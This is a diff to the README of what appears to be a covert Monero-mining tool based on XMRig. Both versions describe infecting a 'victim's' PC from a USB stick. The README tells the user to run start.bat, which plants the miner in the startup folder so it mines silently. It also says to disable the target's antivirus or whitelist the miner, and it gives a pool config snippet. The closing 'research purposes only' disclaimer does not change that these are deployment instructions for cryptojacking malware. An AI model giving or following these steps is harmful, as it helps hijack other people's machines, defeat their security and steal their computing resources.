@@ -1,9 +1,28 @@
-# hidden-miner
-A program based on XMRig to mine monero secretly on the victim's computer. Made to be put on a usb stick to infect PCs easily.
+# Monero Mining Worm
+Monero Mining worm. Spreads manually on a USB stick (only one file to start and the target computer is affected.)
 
 
-# How to setup
+# Setup
 
-You will start by needing a Monero address, a monero mining pool, (I suggest moneroocean) and a brain.
+You will start by needing a Monero address and a monero mining pool, (MoneroOcean is default).
 
-Start by going in xmrig/config.json and change the address with yours, change the pool with the wanted one, or just use the default one that is already there. You can then place all the files on a USB stick to infect computers easily. just run start.bat to infect the victim, and the miner will be put in the startup folder, it will also be running secretly.
+1. Navigate to xmrig/config.json and edit the following lines:
+
+```json
+{
+   "url": "gulf.moneroocean.stream:10064 ", # mining pool url (leave as default if you don't know what a mining pool is)
+   "user": "MONERO-ADDRESS-HERE", # your Monero address
+   "pass": "hidden", # name of the machine that will be displayed on the mining pool
+}
+```
+
+2. copy the code onto a USB drive
+3. Setup Complete
+
+# Spreading Process
+
+1. Disable the antivirus on the target computer or add an exception for xmrig
+2. Plug the USB drive into the computer or download your program from the cloud
+3. Run start.bat. The worm will copy itself to the startup folder and will silently start mining Monero for you.
+
+# This project is intended for testing/research purposes only.
